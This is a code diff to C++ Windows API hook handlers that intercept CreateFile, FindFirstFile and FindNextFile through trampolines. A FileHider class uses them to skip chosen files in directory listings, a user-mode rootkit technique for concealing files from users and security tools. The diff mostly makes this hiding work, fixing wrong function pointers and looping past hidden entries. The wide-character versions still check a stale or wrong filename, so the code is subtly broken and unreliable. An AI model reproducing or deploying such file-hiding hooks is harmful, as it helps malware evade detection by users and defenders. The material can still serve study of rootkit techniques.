@@ -38,7 +38,6 @@ HANDLE __stdcall HookHandlers::HookCreateFileA(LPCSTR lpFileName, DWORD dwDesire
 		std::cout << HookManager::getInstance().getLastHookedFuncName() << std::endl;
 	}
 
-	std::cout << HookManager::getInstance().getLastHookedFuncName() << std::endl;
 	void* trampolineAddress = HookManager::getInstance().getTrampolineAddress("kernel32.dll", "CreateFileA");
 
 	memcpy((void*)(&OriginalCreateFileA), &trampolineAddress, sizeof(uint64_t));
@@ -58,64 +57,70 @@ HANDLE __stdcall HookHandlers::HookCreateFileW(LPCWSTR lpFileName, DWORD dwDesir
 
 	void* trampolineAddress = HookManager::getInstance().getTrampolineAddress("kernel32.dll", "CreateFileW");
 
-	memcpy((void*)(&OriginalCreateFileA), &trampolineAddress, sizeof(uint64_t));
+	memcpy((void*)(&OriginalCreateFileW), &trampolineAddress, sizeof(uint64_t));
 	return OriginalCreateFileW(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);
 }
 
 HANDLE __stdcall HookHandlers::HookFindFirstFileA(LPCSTR lpFileName, LPWIN32_FIND_DATAA lpFindFileData)
 {
-	if (FileHider::getInstance().shouldHideFile(lpFileName)) {
-		SetLastError(ERROR_FILE_NOT_FOUND);
-		return INVALID_HANDLE_VALUE;
-	}
-	
-	void* trampolineAddress = HookManager::getInstance().getTrampolineAddress("kernel32.dll", "FindFirsFileA");
+	HANDLE hFind = nullptr;
+	void* trampolineAddress = HookManager::getInstance().getTrampolineAddress("kernel32.dll", "FindFirstFileA");
+	memcpy((void*)(&OriginalFindFirstFileA), &trampolineAddress, sizeof(uint64_t));
 
-	memcpy((void*)(&OriginalCreateFileA), &trampolineAddress, sizeof(uint64_t));
-	return OriginalFindFirstFileA(lpFileName, lpFindFileData);
+	do {
+		hFind = OriginalFindFirstFileA(lpFileName, lpFindFileData);
+		if (hFind == INVALID_HANDLE_VALUE) return hFind;
+	} while (FileHider::getInstance().shouldHideFile(lpFindFileData->cFileName));
+
+	return hFind;
 }
 
 HANDLE __stdcall HookHandlers::HookFindFirstFileW(LPCWSTR lpFileName, LPWIN32_FIND_DATAW lpFindFileData)
 {
+	HANDLE hFind = nullptr;
 	std::wstring wstr(lpFileName);
 	std::string strFileName(wstr.begin(), wstr.end());
 
-	if (FileHider::getInstance().shouldHideFile(strFileName)) {
-		SetLastError(ERROR_FILE_NOT_FOUND);
-		return INVALID_HANDLE_VALUE;
-	}
+	void* trampolineAddress = HookManager::getInstance().getTrampolineAddress("kernel32.dll", "FindFirstFileW");
+	memcpy((void*)(&OriginalFindFirstFileW), &trampolineAddress, sizeof(uint64_t));
 
-	void* trampolineAddress = HookManager::getInstance().getTrampolineAddress("kernel32.dll", "FindFirsFileW");
+	do {
+		hFind = OriginalFindFirstFileW(lpFileName, lpFindFileData);
+		if (hFind == INVALID_HANDLE_VALUE) return hFind;
+	} while (FileHider::getInstance().shouldHideFile(strFileName));
 
-	memcpy((void*)(&OriginalCreateFileA), &trampolineAddress, sizeof(uint64_t));
-	return OriginalFindFirstFileW(lpFileName, lpFindFileData);
+	return hFind;
 }
+
+// ====================== FindNextFileA / FindNextFileW ======================
 
 BOOL __stdcall HookHandlers::HookFindNextFileA(HANDLE hFindFile, LPWIN32_FIND_DATAA lpFindFileData)
 {
-	if (FileHider::getInstance().shouldHideFile(lpFindFileData->cFileName)) {
-		SetLastError(ERROR_NO_MORE_FILES);
-		return FALSE;
-	}
-
+	BOOL result = FALSE;
 	void* trampolineAddress = HookManager::getInstance().getTrampolineAddress("kernel32.dll", "FindNextFileA");
+	memcpy((void*)(&OriginalFindNextFileA), &trampolineAddress, sizeof(uint64_t));
 
-	memcpy((void*)(&OriginalCreateFileA), &trampolineAddress, sizeof(uint64_t));
-	return OriginalFindNextFileA(hFindFile, lpFindFileData);
+	do {
+		result = OriginalFindNextFileA(hFindFile, lpFindFileData);
+		if (!result) return FALSE;
+	} while (FileHider::getInstance().shouldHideFile(lpFindFileData->cFileName));
+
+	return result;
 }
 
 BOOL __stdcall HookHandlers::HookFindNextFileW(HANDLE hFindFile, LPWIN32_FIND_DATAW lpFindFileData)
 {
+	BOOL result = FALSE;
 	std::wstring wstr(lpFindFileData->cFileName);
 	std::string strFileName(wstr.begin(), wstr.end());
 
-	if (FileHider::getInstance().shouldHideFile(strFileName)) {
-		SetLastError(ERROR_NO_MORE_FILES);
-		return FALSE;
-	}
-
 	void* trampolineAddress = HookManager::getInstance().getTrampolineAddress("kernel32.dll", "FindNextFileW");
+	memcpy((void*)(&OriginalFindNextFileW), &trampolineAddress, sizeof(uint64_t));
 
-	memcpy((void*)(&OriginalCreateFileA), &trampolineAddress, sizeof(uint64_t));
-	return OriginalFindNextFileW(hFindFile, lpFindFileData);
+	do {
+		result = OriginalFindNextFileW(hFindFile, lpFindFileData);
+		if (!result) return FALSE;
+	} while (FileHider::getInstance().shouldHideFile(strFileName));
+
+	return result;
 }
